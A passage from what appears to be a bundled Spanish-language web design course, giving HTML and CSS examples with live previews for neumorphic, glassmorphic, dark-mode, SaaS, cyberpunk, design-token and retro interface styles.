### Ejemplo 2: Botn Cncavo (Inset)
Simulando un botn que ha sido presionado fsicamente.


<details class="code-details">
<summary class="code-summary">Ver Cdigo (HTML + CSS)</summary>

### ESTRUCTURA (HTML)
\`\`\`html
<div style="background:#e0e0e0; padding:1.2rem 2.5rem; border-radius:12px; box-shadow: inset 8px 8px 16px #bebebe, inset -8px -8px 16px #ffffff; color:#a3b1c6; font-weight:bold; font-family:sans-serif;">
    PRESSED
  </div>
\`\`\`

### ESTILOS (CSS)
\`\`\`css
.soft-inset {
  box-shadow: inset 6px 6px 12px #bebebe, inset -6px -6px 12px #ffffff;
}
\`\`\`

</details>

<details class="preview-details">
<summary class="preview-summary">Ver Resultado: Inset Button</summary>
<div class="preview-box">
<div style="background:#e0e0e0; padding:1.2rem 2.5rem; border-radius:12px; box-shadow: inset 8px 8px 16px #bebebe, inset -8px -8px 16px #ffffff; color:#a3b1c6; font-weight:bold; font-family:sans-serif;">
    PRESSED
  </div>
</div>
</details>

### Ejemplo 3: Icono Neumrfico
Detalles finos para un look tctil.


<details class="code-details">
<summary class="code-summary">Ver Cdigo (HTML + CSS)</summary>

### ESTRUCTURA (HTML)
\`\`\`html
<div style="width:60px; height:60px; background:#e0e0e0; border-radius:50%; box-shadow: 6px 6px 12px #bebebe, -6px -6px 12px #ffffff; display:flex; align-items:center; justify-content:center; color:#10b981; font-size:1.5rem;">+</div>
\`\`\`

### ESTILOS (CSS)
\`\`\`css
.soft-icon { box-shadow: 4px 4px 8px #bebebe, -4px -4px 8px #ffffff; }
\`\`\`

</details>

<details class="preview-details">
<summary class="preview-summary">Ver Resultado: Soft Icon</summary>
<div class="preview-box">
<div style="width:60px; height:60px; background:#e0e0e0; border-radius:50%; box-shadow: 6px 6px 12px #bebebe, -6px -6px 12px #ffffff; display:flex; align-items:center; justify-content:center; color:#10b981; font-size:1.5rem;">+</div>
</div>
</details>

### Ejemplo 4: Neumorphic Switch (Toggle)
Interaccin tctil para opciones binarias.


<details class="code-details">
<summary class="code-summary">Ver Cdigo (HTML + CSS)</summary>

### ESTRUCTURA (HTML)
\`\`\`html
<div style="width:70px; height:35px; background:#e0e0e0; border-radius:35px; box-shadow: inset 4px 4px 8px #bebebe, inset -4px -4px 8px #ffffff; position:relative; display:flex; align-items:center; padding:0 5px;">
    <div style="width:25px; height:25px; background:#e0e0e0; border-radius:50%; box-shadow: 2px 2px 5px #bebebe, -2px -2px 5px #ffffff; position:absolute; left:40px;"></div>
  </div>
\`\`\`

### ESTILOS (CSS)
\`\`\`css
.example-element {
  width:70px;
  height:35px;
  background:#e0e0e0;
  border-radius:35px;
  box-shadow: inset 4px 4px 8px #bebebe, inset -4px -4px 8px #ffffff;
  position:relative;
  display:flex;
  align-items:center;
  padding:0 5px;
}
\`\`\`

</details>

<details class="preview-details">
<summary class="preview-summary">Ver Resultado: Soft Toggle</summary>
<div class="preview-box">
<div style="width:70px; height:35px; background:#e0e0e0; border-radius:35px; box-shadow: inset 4px 4px 8px #bebebe, inset -4px -4px 8px #ffffff; position:relative; display:flex; align-items:center; padding:0 5px;">
    <div style="width:25px; height:25px; background:#e0e0e0; border-radius:50%; box-shadow: 2px 2px 5px #bebebe, -2px -2px 5px #ffffff; position:absolute; left:40px;"></div>
  </div>
</div>
</details>

### Ejemplo 5: Neumorphic Search Bar
Un campo de entrada que parece estar hundido en la superficie.


<details class="code-details">
<summary class="code-summary">Ver Cdigo (HTML + CSS)</summary>

### ESTRUCTURA (HTML)
\`\`\`html
<div style="width:250px; background:#e0e0e0; padding:12px 20px; border-radius:50px; box-shadow: inset 6px 6px 12px #bebebe, inset -6px -6px 12px #ffffff; display:flex; justify-content:space-between; align-items:center; color:#999; font-family:sans-serif; font-size:0.8rem;">
    <span>Search modules...</span>
    <span></span>
  </div>
\`\`\`

### ESTILOS (CSS)
\`\`\`css
.example-element {
  width:250px;
  background:#e0e0e0;
  padding:12px 20px;
  border-radius:50px;
  box-shadow: inset 6px 6px 12px #bebebe, inset -6px -6px 12px #ffffff;
  display:flex;
  justify-content:space-between;
  align-items:center;
  color:#999;
  font-family:sans-serif;
  font-size:0.8rem;
}
\`\`\`

</details>

<details class="preview-details">
<summary class="preview-summary">Ver Resultado: Soft Search</summary>
<div class="preview-box">
<div style="width:250px; background:#e0e0e0; padding:12px 20px; border-radius:50px; box-shadow: inset 6px 6px 12px #bebebe, inset -6px -6px 12px #ffffff; display:flex; justify-content:space-between; align-items:center; color:#999; font-family:sans-serif; font-size:0.8rem;">
    <span>Search modules...</span>
    <span></span>
  </div>
</div>
</details>

`,completed:!1},{id:"visual-arch-3-4-glassmorphism",title:"3.4 Glassmorphism (Efecto Vidrio)",level:"junior",content:`# 3.4 Glassmorphism

Capa translcida con desenfoque de fondo.

---

##  Ejemplos Prcticos de Aplicacin

### Ejemplo 1: Frosty Card
El efecto clsico de cristal esmerilado.


<details class="code-details">
<summary class="code-summary">Ver Cdigo (HTML + CSS)</summary>

### ESTRUCTURA (HTML)
\`\`\`html
<h1 style="font-size:3rem; font-weight:900; font-family:sans-serif; background: linear-gradient(135deg, #10b981, #3b82f6); -webkit-background-clip: text; color: transparent; margin:0;">Scalable AI.</h1>
\`\`\`

### ESTILOS (CSS)
\`\`\`css
.glass {
  background: rgba(255, 255, 255, 0.1);
  backdrop-filter: blur(10px);
  border: 1px solid rgba(255, 255, 255, 0.2);
}
\`\`\`

</details>


<details class="preview-details">
<summary class="preview-summary">Ver Resultado: Frosty Card</summary>
<div class="preview-box" style="background: linear-gradient(45deg, #ee0979, #ff6a00); position:relative; min-height:250px; border-radius:12px;">
  <div style="position:absolute; width:100px; height:100px; background:#fff; border-radius:50%; top:20px; left:20px; opacity:0.3;"></div>
  <div style="background: rgba(255, 255, 255, 0.1); backdrop-filter: blur(12px); -webkit-backdrop-filter: blur(12px); border: 1px solid rgba(255, 255, 255, 0.3); border-radius: 20px; padding: 2rem; width: 220px; color: white; font-family: sans-serif; position: relative; z-index: 2; box-shadow: 0 8px 32px rgba(0,0,0,0.1);">
    <div style="font-weight:900; font-size:1.5rem; margin-bottom:0.5rem;">GLASS</div>
    <div style="font-size:0.8rem; opacity:0.8;">The background is blurred.</div>
  </div>
</div>
</details>

### Ejemplo 2: Dark Glass (Cyber Glass)
Vidrio oscuro para interfaces futuristas.


<details class="code-details">
<summary class="code-summary">Ver Cdigo</summary>

\`\`\`css
.dark-glass {
  background: rgba(0, 0, 0, 0.4);
  backdrop-filter: blur(20px);
  border: 1px solid rgba(255, 255, 255, 0.1);
}
\`\`\`

</details>


<details class="preview-details">
<summary class="preview-summary">Ver Resultado: Dark Glass</summary>
<div class="preview-box" style="background:#000;">
  <div style="background: rgba(30,30,30, 0.6); backdrop-filter: blur(15px); border: 1px solid rgba(255,255,255,0.05); padding: 2rem; border-radius: 12px; color: #10b981; font-family: monospace; width: 200px; text-align:center;">
    > LOADING... <br/>
    [ACCESS GRANTED]
  </div>
</div>
</details>

### Ejemplo 3: Glass Button
Un botn que deja pasar la complejidad del fondo sin perder legibilidad.


<details class="code-details">
<summary class="code-summary">Ver Cdigo</summary>

\`\`\`css
.btn-glass { background: rgba(255,255,255,0.05); backdrop-filter: blur(5px); }
\`\`\`

</details>


<details class="preview-details">
<summary class="preview-summary">Ver Resultado: Glass Button</summary>
<div class="preview-box" style="background: linear-gradient(to right, #6a11cb 0%, #2575fc 100%); border-radius:12px;">
  <button style="background: rgba(255,255,255,0.1); backdrop-filter: blur(10px); color: white; border: 1px solid rgba(255,255,255,0.2); padding: 12px 30px; border-radius: 50px; font-weight: bold; cursor: pointer; font-family:sans-serif;">PULSAR CRISTAL</button>
</div>
</details>

### Ejemplo 4: Sidebar de Cristal
Navegacin lateral translcida sobre fondos complejos.


<details class="code-details">
<summary class="code-summary">Ver Cdigo</summary>

\`\`\`css
.example-element {
  background:url('https://images.unsplash.com/photo-1451187580459-43490279c0fa?auto=format&fit=crop&w=400&q=80');
  background-size:cover;
  justify-content:flex-start;
  padding:0;
}
\`\`\`

</details>

<details class="preview-details">
<summary class="preview-summary">Ver Resultado: Glass Nav</summary>
<div class="preview-box" style="background:url('https://images.unsplash.com/photo-1451187580459-43490279c0fa?auto=format&fit=crop&w=400&q=80'); background-size:cover; justify-content:flex-start; padding:0;">
  <div style="width:80px; height:100%; background:rgba(0,0,0,0.4); backdrop-filter:blur(15px); -webkit-backdrop-filter:blur(15px); border-right:1px solid rgba(255,255,255,0.1); display:flex; flex-direction:column; align-items:center; gap:20px; padding-top:20px;">
    <div style="width:40px; height:40px; background:rgba(255,255,255,0.1); border-radius:10px;"></div>
    <div style="width:40px; height:40px; background:rgba(255,255,255,0.05); border-radius:10px;"></div>
    <div style="width:40px; height:40px; background:rgba(255,255,255,0.05); border-radius:10px;"></div>
  </div>
</div>
</details>

### Ejemplo 5: Notificacin Flotante de Cristal
Aviso sutil que no bloquea completamente la vista del contenido inferior.


<details class="code-details">
<summary class="code-summary">Ver Cdigo</summary>

\`\`\`css
.example-element {
  background:linear-gradient(to right, #6366f1, #a855f7);
}
\`\`\`

</details>

<details class="preview-details">
<summary class="preview-summary">Ver Resultado: Glass Toast</summary>
<div class="preview-box" style="background:linear-gradient(to right, #6366f1, #a855f7);">
  <div style="background:rgba(255,255,255,0.1); backdrop-filter:blur(10px); border:1px solid rgba(255,255,255,0.2); border-radius:12px; padding:12px 20px; color:#fff; font-family:sans-serif; display:flex; align-items:center; gap:10px; box-shadow: 0 10px 15px rgba(0,0,0,0.1);">
    <span style="color:#4ade80;"></span>
    <span style="font-size:0.8rem; font-weight:bold;">Sistema Actualizado</span>
  </div>
</div>
</details>

`,completed:!1},{id:"visual-arch-3-5-dark-mode",title:"3.5 Dark Mode Moderno",level:"junior",content:`# 3.5 Dark Mode Moderno

Ms all del negro puro: Gestionando la fatiga visual.

---

##  Ejemplos Prcticos de Aplicacin

### Ejemplo 1: El Gris Profundo
Fondo elegante que no genera alto contraste molesto para el ojo.


<details class="code-details">
<summary class="code-summary">Ver Cdigo</summary>

\`\`\`css
.deep-dark { background: #0f172a; color: #f8fafc; }
\`\`\`

</details>


<details class="preview-details">
<summary class="preview-summary">Ver Resultado: Deep Night</summary>
<div class="preview-box" style="background: #0f172a; border-radius:12px;">
  <div style="max-width:300px; color:#f8fafc; font-family:sans-serif; text-align:center;">
    <h3 style="color:#fff;">Night Mode</h3>
    <p style="color:#94a3b8; font-size:0.9rem;">Perfecto para sesiones largas.</p>
  </div>
</div>
</details>

### Ejemplo 2: Iluminacin de Superficies
Capas ms altas son ms claras.


<details class="code-details">
<summary class="code-summary">Ver Cdigo</summary>

\`\`\`css
.surface-card { background: #1e293b; border: 1px solid #334155; }
\`\`\`

</details>


<details class="preview-details">
<summary class="preview-summary">Ver Resultado: Elevation</summary>
<div class="preview-box" style="background: #0f172a; flex-direction:column; gap:10px; border-radius:12px;">
  <div style="background:#1e293b; padding:15px; border-radius:8px; width:220px; color:#94a3b8; font-size:0.8rem; font-family:sans-serif; border:1px solid #334155;">Surface 1 (Card)</div>
  <div style="background:#334155; padding:15px; border-radius:8px; width:220px; color:#f8fafc; font-size:0.8rem; font-family:sans-serif; transform:translateX(20px); border:1px solid #475569;">Surface 2 (Tooltip)</div>
</div>
</details>

### Ejemplo 3: Neon Accent
Un toque de color en la oscuridad total.


<details class="code-details">
<summary class="code-summary">Ver Cdigo</summary>

\`\`\`css
.example-element {
  background: #020617;
  border-radius:12px;
}
\`\`\`

</details>

<details class="preview-details">
<summary class="preview-summary">Ver Resultado: Neon Accent</summary>
<div class="preview-box" style="background: #020617; border-radius:12px;">
  <div style="font-family:sans-serif; font-weight:900; color:#10b981; font-size:2rem; text-shadow:0 0 15px #10b981;">ONLINE</div>
</div>
</details>

### Ejemplo 4: Resplandor de Texto (Text Glow)
El uso de sombras de texto para crear un efecto de "luz" en interfaces oscuras.


<details class="code-details">
<summary class="code-summary">Ver Cdigo</summary>

\`\`\`css
.example-element {
  background:#020617;
}
\`\`\`

</details>

<details class="preview-details">
<summary class="preview-summary">Ver Resultado: Glow Text</summary>
<div class="preview-box" style="background:#020617;">
  <div style="color:#3b82f6; font-family:sans-serif; font-weight:900; font-size:3rem; text-shadow: 0 0 20px #3b82f6, 0 0 40px rgba(59, 130, 246, 0.5);">CYBER</div>
</div>
</details>

### Ejemplo 5: Borde de Gradiente en Card Oscura
Un detalle de alta gama que separa los componentes sin usar lneas slidas aburridas.


<details class="code-details">
<summary class="code-summary">Ver Cdigo</summary>

\`\`\`css
.example-element {
  background:#000;
}
\`\`\`

</details>

<details class="preview-details">
<summary class="preview-summary">Ver Resultado: Glow Border Card</summary>
<div class="preview-box" style="background:#000;">
  <div style="padding:1px; background:linear-gradient(45deg, #10b981, transparent, #3b82f6); border-radius:16px;">
    <div style="background:#0a0a0a; padding:2rem; border-radius:15px; color:#fff; font-family:sans-serif; width:200px;">
       <div style="font-size:0.7rem; color:#666; margin-bottom:0.5rem;">STATISTICS</div>
       <div style="font-size:1.5rem; font-weight:900;">99.9%</div>
    </div>
  </div>
</div>
</details>

`,completed:!1},{id:"visual-arch-3-6-tech-startup",title:"3.6 Tech Startup Clean (SaaS)",level:"junior",content:`# 3.6 Tech Startup Clean

El estilo de las empresas SaaS modernas.

---

##  Ejemplos Prcticos de Aplicacin

### Ejemplo 1: Gradient Title
Ttulos de alto impacto.


<details class="code-details">
<summary class="code-summary">Ver Cdigo</summary>

\`\`\`css
.gradient-text { background: linear-gradient(to right, #10b981, #3b82f6); -webkit-background-clip: text; color: transparent; }
\`\`\`

</details>

<details class="preview-details">
<summary class="preview-summary">Ver Resultado: Tech Gradient</summary>
<div class="preview-box">
<h1 style="font-size:3rem; font-weight:900; font-family:sans-serif; background: linear-gradient(135deg, #10b981, #3b82f6); -webkit-background-clip: text; color: transparent; margin:0;">Scalable AI.</h1>
</div>
</details>

### Ejemplo 2: SaaS Feature Card
Simple, limpia y con hover sutil.


<details class="code-details">
<summary class="code-summary">Ver Cdigo (HTML + CSS)</summary>

### ESTRUCTURA (HTML)
\`\`\`html
<div style="background:#fff; border:1px solid #eee; border-radius:16px; padding:2rem; width:200px; font-family:sans-serif; text-align:center;">
    <div style="color:#3b82f6; font-size:2rem; margin-bottom:1rem;"></div>
    <div style="font-weight:700; color:#111; margin-bottom:0.5rem;">Fast API</div>
    <div style="font-size:0.8rem; color:#666;">Ultra low latency.</div>
  </div>
\`\`\`

### ESTILOS (CSS)
\`\`\`css
.example-element {
  background:#fff;
  border:1px solid #eee;
  border-radius:16px;
  padding:2rem;
  width:200px;
  font-family:sans-serif;
  text-align:center;
}
\`\`\`

</details>

<details class="preview-details">
<summary class="preview-summary">Ver Resultado: Feature Card</summary>
<div class="preview-box">
<div style="background:#fff; border:1px solid #eee; border-radius:16px; padding:2rem; width:200px; font-family:sans-serif; text-align:center;">
    <div style="color:#3b82f6; font-size:2rem; margin-bottom:1rem;"></div>
    <div style="font-weight:700; color:#111; margin-bottom:0.5rem;">Fast API</div>
    <div style="font-size:0.8rem; color:#666;">Ultra low latency.</div>
  </div>
</div>
</details>

### Ejemplo 3: Shimmer Button
Efecto de brillo premium.


<details class="code-details">
<summary class="code-summary">Ver Cdigo (HTML + CSS)</summary>

### ESTRUCTURA (HTML)
\`\`\`html
<button style="background:#111; color:white; border:none; padding:12px 30px; border-radius:8px; font-weight:bold; position:relative; overflow:hidden; font-family:sans-serif; cursor:pointer;">
    GET STARTED
    <div style="position:absolute; top:0; left:-100%; width:100%; height:100%; background:linear-gradient(90deg, transparent, rgba(255,255,255,0.1), transparent); animation: shimmer 2.5s infinite;"></div>
    <style>@keyframes shimmer { 100% { left: 100%; } }</style>
  </button>
\`\`\`

### ESTILOS (CSS)
\`\`\`css
.example-element {
  background:#111;
  color:white;
  border:none;
  padding:12px 30px;
  border-radius:8px;
  font-weight:bold;
  position:relative;
  overflow:hidden;
  font-family:sans-serif;
  cursor:pointer;
}
\`\`\`

</details>

<details class="preview-details">
<summary class="preview-summary">Ver Resultado: Shimmer</summary>
<div class="preview-box">
<button style="background:#111; color:white; border:none; padding:12px 30px; border-radius:8px; font-weight:bold; position:relative; overflow:hidden; font-family:sans-serif; cursor:pointer;">
    GET STARTED
    <div style="position:absolute; top:0; left:-100%; width:100%; height:100%; background:linear-gradient(90deg, transparent, rgba(255,255,255,0.1), transparent); animation: shimmer 2.5s infinite;"></div>
    <style>@keyframes shimmer { 100% { left: 100%; } }</style>
  </button>
</div>
</details>

### Ejemplo 4: Grupo de Avatares Flotante
Patrn comn en herramientas de colaboracin (Figma, Notion).


<details class="code-details">
<summary class="code-summary">Ver Cdigo (HTML + CSS)</summary>

### ESTRUCTURA (HTML)
\`\`\`html
<div style="display:flex; -webkit-mask: linear-gradient(#fff 0 0); margin-left:10px;">
    <div style="width:40px; height:40px; background:#10b981; border:2px solid #0a0a0a; border-radius:50%; margin-left:-10px;"></div>
    <div style="width:40px; height:40px; background:#3b82f6; border:2px solid #0a0a0a; border-radius:50%; margin-left:-10px;"></div>
    <div style="width:40px; height:40px; background:#f59e0b; border:2px solid #0a0a0a; border-radius:50%; margin-left:-10px;"></div>
    <div style="width:40px; height:40px; background:#333; border:2px solid #0a0a0a; border-radius:50%; margin-left:-10px; display:flex; align-items:center; justify-content:center; color:white; font-size:0.7rem; font-weight:bold;">+12</div>
  </div>
\`\`\`

### ESTILOS (CSS)
\`\`\`css
.example-element {
  display:flex;
  -webkit-mask: linear-gradient(#fff 0 0);
  margin-left:10px;
}
\`\`\`

</details>

<details class="preview-details">
<summary class="preview-summary">Ver Resultado: Avatar Group</summary>
<div class="preview-box">
<div style="display:flex; -webkit-mask: linear-gradient(#fff 0 0); margin-left:10px;">
    <div style="width:40px; height:40px; background:#10b981; border:2px solid #0a0a0a; border-radius:50%; margin-left:-10px;"></div>
    <div style="width:40px; height:40px; background:#3b82f6; border:2px solid #0a0a0a; border-radius:50%; margin-left:-10px;"></div>
    <div style="width:40px; height:40px; background:#f59e0b; border:2px solid #0a0a0a; border-radius:50%; margin-left:-10px;"></div>
    <div style="width:40px; height:40px; background:#333; border:2px solid #0a0a0a; border-radius:50%; margin-left:-10px; display:flex; align-items:center; justify-content:center; color:white; font-size:0.7rem; font-weight:bold;">+12</div>
  </div>
</div>
</details>

### Ejemplo 5: El Botn de Micro-Shimmer (Premium Action)
Un brillo sutil que recorre el botn para invitar al clic de forma elegante.


<details class="code-details">
<summary class="code-summary">Ver Cdigo (HTML + CSS)</summary>

### ESTRUCTURA (HTML)
\`\`\`html
<button style="background:#fff; color:#000; border:none; border-radius:8px; padding:12px 35px; font-weight:900; font-family:sans-serif; position:relative; overflow:hidden; cursor:pointer;">
    RESERVAR AHORA
    <div style="position:absolute; top:0; left:-100%; width:100%; height:100%; background:linear-gradient(90deg, transparent, rgba(0,0,0,0.05), transparent); animation: shimmer 3s infinite;"></div>
    <style>@keyframes shimmer { 100% { left: 100%; } }</style>
  </button>
\`\`\`

### ESTILOS (CSS)
\`\`\`css
.example-element {
  background:#fff;
  color:#000;
  border:none;
  border-radius:8px;
  padding:12px 35px;
  font-weight:900;
  font-family:sans-serif;
  position:relative;
  overflow:hidden;
  cursor:pointer;
}
\`\`\`

</details>

<details class="preview-details">
<summary class="preview-summary">Ver Resultado: Micro Shimmer</summary>
<div class="preview-box">
<button style="background:#fff; color:#000; border:none; border-radius:8px; padding:12px 35px; font-weight:900; font-family:sans-serif; position:relative; overflow:hidden; cursor:pointer;">
    RESERVAR AHORA
    <div style="position:absolute; top:0; left:-100%; width:100%; height:100%; background:linear-gradient(90deg, transparent, rgba(0,0,0,0.05), transparent); animation: shimmer 3s infinite;"></div>
    <style>@keyframes shimmer { 100% { left: 100%; } }</style>
  </button>
</div>
</details>

### Ejemplo 4: Escala Tipogrfica (Tokens)
Variables que definen el ritmo de lectura.


<details class="code-details">
<summary class="code-summary">Ver Cdigo (HTML + CSS)</summary>

### ESTRUCTURA (HTML)
\`\`\`html
<div style="display:flex; align-items:flex-end; gap:20px; color:#10b981;">
    <div style="width:10px; height:8px; background:currentColor; border-radius:2px;"></div>
    <div style="width:10px; height:16px; background:currentColor; border-radius:2px;"></div>
    <div style="width:10px; height:32px; background:currentColor; border-radius:2px;"></div>
    <div style="width:10px; height:64px; background:currentColor; border-radius:2px;"></div>
  </div>
\`\`\`

### ESTILOS (CSS)
\`\`\`css
.example-element {
  flex-direction:column;
  align-items:flex-start;
  gap:5px;
}
\`\`\`

</details>

<details class="preview-details">
<summary class="preview-summary">Ver Resultado: Type Scale</summary>
<div class="preview-box" style="flex-direction:column; align-items:flex-start; gap:5px;">
  <div style="font-size:2.5rem; font-weight:900; color:#fff;">Display L</div>
  <div style="font-size:1.5rem; font-weight:700; color:#10b981;">Heading M</div>
  <div style="font-size:1rem; color:#888;">Body Regular</div>
  <div style="font-size:0.7rem; color:#666; text-transform:uppercase;">Caption XS</div>
</div>
</details>

### Ejemplo 5: Motion Timing Tokens
Definiendo la velocidad de las interacciones para que el sistema se sienta coherente.


<details class="code-details">
<summary class="code-summary">Ver Cdigo</summary>

\`\`\`css
.example-element {
  flex-direction:column;
  gap:10px;
}
\`\`\`

</details>

<details class="preview-details">
<summary class="preview-summary">Ver Resultado: Timing Tokens</summary>
<div class="preview-box" style="flex-direction:column; gap:10px;">
  <div style="width:100%; height:4px; background:#333; position:relative;">
    <div style="position:absolute; width:20px; height:20px; background:#10b981; border-radius:50%; top:-8px; left:0; animation: move 150ms infinite alternate ease-out;"></div>
  </div>
  <div style="font-size:0.6rem; color:#666;">FAST (150ms) - UI Feedback</div>
  <div style="width:100%; height:4px; background:#333; position:relative;">
    <div style="position:absolute; width:20px; height:20px; background:#3b82f6; border-radius:50%; top:-8px; left:0; animation: move 500ms infinite alternate ease-in-out;"></div>
  </div>
  <div style="font-size:0.6rem; color:#666;">SMOOTH (500ms) - Page Transitions</div>
  <style>@keyframes move { to { left: 90%; } }</style>
</div>
</details>


`,completed:!1},{id:"visual-arch-4-1-cyberpunk",title:"4.1 Esttica Cyberpunk",level:"junior",content:`# 4.1 Esttica Cyberpunk

Distopa neon y alta tecnologa.

---

##  Ejemplos Prcticos de Aplicacin

### Ejemplo 1: Glitch Effect
Texto corrupto por esttica.


<details class="code-details">
<summary class="code-summary">Ver Cdigo</summary>

\`\`\`css
.example-element {
  background:#000;
  border-radius:12px;
}
\`\`\`

</details>

<details class="preview-details">
<summary class="preview-summary">Ver Resultado: Glitch Text</summary>
<div class="preview-box" style="background:#000; border-radius:12px;">
  <div style="font-family:monospace; font-size:3rem; font-weight:bold; color:#fff; position:relative; letter-spacing:5px;">
    ACCESS
    <span style="position:absolute; top:0; left:2px; color:#f0f; opacity:0.5; z-index:-1;">ACCESS</span>
    <span style="position:absolute; top:0; left:-2px; color:#0ff; opacity:0.5; z-index:-1;">ACCESS</span>
  </div>
</div>
</details>

### Ejemplo 2: Border Neon
Bordes que emiten luz.


<details class="code-details">
<summary class="code-summary">Ver Cdigo</summary>

\`\`\`css
.example-element {
  background:#050510;
  border-radius:12px;
}
\`\`\`

</details>

<details class="preview-details">
<summary class="preview-summary">Ver Resultado: Neon Border</summary>
<div class="preview-box" style="background:#050510; border-radius:12px;">
  <div style="border:2px solid #0fa; box-shadow:0 0 15px #0fa; padding:1rem 2.5rem; color:#0fa; font-family:monospace; font-weight:bold; border-radius:4px;">STATUS: ACTIVE</div>
</div>
</details>

### Ejemplo 3: Cyber Window
Contenedor con esquinas recortadas.


<details class="code-details">
<summary class="code-summary">Ver Cdigo</summary>

\`\`\`css
.cyber-panel { clip-path: polygon(10% 0, 100% 0, 100% 90%, 90% 100%, 0 100%, 0 10%); }
\`\`\`

</details>


<details class="preview-details">
<summary class="preview-summary">Ver Resultado: Cyber Panel</summary>
<div class="preview-box" style="background:#222; border-radius:12px;">
  <div style="background:#fd01ef; padding:3px;">
    <div style="background:#000; padding:2rem; clip-path: polygon(0 0, 100% 0, 100% 80%, 80% 100%, 0 100%); color:#fff; font-family:sans-serif; font-weight:900;">DATA TERMINAL</div>
  </div>
</div>
</details>

### Ejemplo 4: Escaneo Lineal (Scanlines)
Efecto de monitor antiguo CRT para dar atmsfera.


<details class="code-details">
<summary class="code-summary">Ver Cdigo</summary>

\`\`\`css
.example-element {
  background:#050505;
  position:relative;
  overflow:hidden;
}
\`\`\`

</details>

<details class="preview-details">
<summary class="preview-summary">Ver Resultado: Scanlines</summary>
<div class="preview-box" style="background:#050505; position:relative; overflow:hidden;">
  <div style="position:absolute; inset:0; background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.45) 50%), linear-gradient(90deg, rgba(255, 0, 0, 0.05), rgba(0, 255, 0, 0.02), rgba(0, 0, 255, 0.05)); background-size: 100% 4px, 3px 100%; pointer-events:none; z-index:2;"></div>
  <div style="color:#0f0; font-family:monospace; padding:2rem; position:relative; z-index:1;">
    [SYSTEM_BOOT] <br/>
    Loading kernel... OK <br/>
    Establishing link... CONNECTED
  </div>
</div>
</details>

### Ejemplo 5: Botn Glitch (Interactive)
Un botn que parece romperse por momentos.


<details class="code-details">
<summary class="code-summary">Ver Cdigo</summary>

\`\`\`css
.example-element {
  background:#000;
}
\`\`\`

</details>

<details class="preview-details">
<summary class="preview-summary">Ver Resultado: Glitch Button</summary>
<div class="preview-box" style="background:#000;">
  <button style="background:#ff003c; color:white; border:none; padding:12px 30px; font-weight:900; font-family:sans-serif; text-transform:uppercase; letter-spacing:3px; position:relative; cursor:pointer;" onmouseover="this.querySelector('.glitch-layer').style.display='block'" onmouseout="this.querySelector('.glitch-layer').style.display='none'">
    DESTROY
    <div class="glitch-layer" style="display:none; position:absolute; top:0; left:0; width:100%; height:100%; background:#00f3ff; mix-blend-mode:hard-light; animation: glitch 0.2s infinite; opacity:0.5;"></div>
    <style>@keyframes glitch { 0% { transform: translate(2px, -2px); } 50% { transform: translate(-2px, 2px); } 100% { transform: translate(0); } }</style>
  </button>
</div>
</details>

`,completed:!1},{id:"visual-arch-5-1-design-tokens",title:"5.1 Design Tokens",level:"senior",content:`# 5.1 Design Tokens

El lenguaje del diseo escalable.

---

##  Ejemplos Prcticos de Aplicacin

### Ejemplo 1: Semantic Tokens
Variable por funcin.


<details class="code-details">
<summary class="code-summary">Ver Cdigo</summary>

\`\`\`css
.example-element {
  flex-direction:column;
  gap:10px;
}
\`\`\`

</details>

<details class="preview-details">
<summary class="preview-summary">Ver Resultado: Token Colors</summary>
<div class="preview-box" style="flex-direction:column; gap:10px;">
  <div style="display:flex; gap:15px;">
    <div style="width:100px; height:50px; background:#10b981; border-radius:4px; display:flex; align-items:center; justify-content:center; color:#000; font-size:0.7rem; font-weight:bold;">Primary</div>
    <div style="width:100px; height:50px; background:#ef4444; border-radius:4px; display:flex; align-items:center; justify-content:center; color:#fff; font-size:0.7rem; font-weight:bold;">Danger</div>
  </div>
</div>
</details>

### Ejemplo 2: Spacing System
Ritmo matemtico.


<details class="code-details">
<summary class="code-summary">Ver Cdigo</summary>

\`\`\`css
.example-element {
  display:flex;
  align-items:flex-end;
  gap:20px;
  color:#10b981;
}
\`\`\`

</details>

<details class="preview-details">
<summary class="preview-summary">Ver Resultado: Spacing Scale</summary>
<div class="preview-box">
<div style="display:flex; align-items:flex-end; gap:20px; color:#10b981;">
    <div style="width:10px; height:8px; background:currentColor; border-radius:2px;"></div>
    <div style="width:10px; height:16px; background:currentColor; border-radius:2px;"></div>
    <div style="width:10px; height:32px; background:currentColor; border-radius:2px;"></div>
    <div style="width:10px; height:64px; background:currentColor; border-radius:2px;"></div>
  </div>
</div>
</details>

### Ejemplo 3: Elevation Shadows
Sombras predefinidas.


<details class="code-details">
<summary class="code-summary">Ver Cdigo (HTML + CSS)</summary>

### ESTRUCTURA (HTML)
\`\`\`html
<div style="font-family:serif; font-size:4rem; font-weight:900; color:transparent; -webkit-text-stroke:1px #ff71ce; letter-spacing:10px;">VIBE</div>
\`\`\`

### ESTILOS (CSS)
\`\`\`css
.example-element {
  background:#f3f4f6;
  border-radius:12px;
}
\`\`\`

</details>

<details class="preview-details">
<summary class="preview-summary">Ver Resultado: Shadows Scale</summary>
<div class="preview-box" style="background:#f3f4f6; border-radius:12px;">
  <div style="display:flex; gap:30px;">
    <div style="width:60px; height:60px; background:#fff; box-shadow:0 2px 4px rgba(0,0,0,0.1); border-radius:8px;"></div>
    <div style="width:60px; height:60px; background:#fff; box-shadow:0 15px 30px rgba(0,0,0,0.2); border-radius:8px;"></div>
  </div>
</div>
</details>
`,completed:!1},{id:"visual-arch-4-2-retro-vaporwave",title:"4.2 Retro / Vaporwave",level:"junior",content:`# 4.2 Retro / Vaporwave

Nostalgia digital de los 80s y 90s.

---

##  Ejemplos Prcticos de Aplicacin

### Ejemplo 1: El Botn "Win95"
El clsico botn gris con bordes biselados.


<details class="code-details">
<summary class="code-summary">Ver Cdigo</summary>

\`\`\`css
.example-element {
  background:#008080;
  border-radius:12px;
}
\`\`\`

</details>

<details class="preview-details">
<summary class="preview-summary">Ver Resultado: Win95 Button</summary>
<div class="preview-box" style="background:#008080; border-radius:12px;">
  <button style="background:#c0c0c0; border:2px solid; border-color:#fff #808080 #808080 #fff; padding:5px 20px; font-family:sans-serif; font-size:12px; font-weight:bold; cursor:pointer;">Aceptar</button>
</div>
</details>

### Ejemplo 2: Sunset Gradient
Degradados de rosa a azul con sol de rejilla.


<details class="code-details">
<summary class="code-summary">Ver Cdigo</summary>

\`\`\`css
.example-element {
  background:#1a1a1a;
  flex-direction:column;
  border-radius:12px;
}
\`\`\`

</details>

<details class="preview-details">
<summary class="preview-summary">Ver Resultado: Vaporwave Sunset</summary>
<div class="preview-box" style="background:#1a1a1a; flex-direction:column; border-radius:12px;">
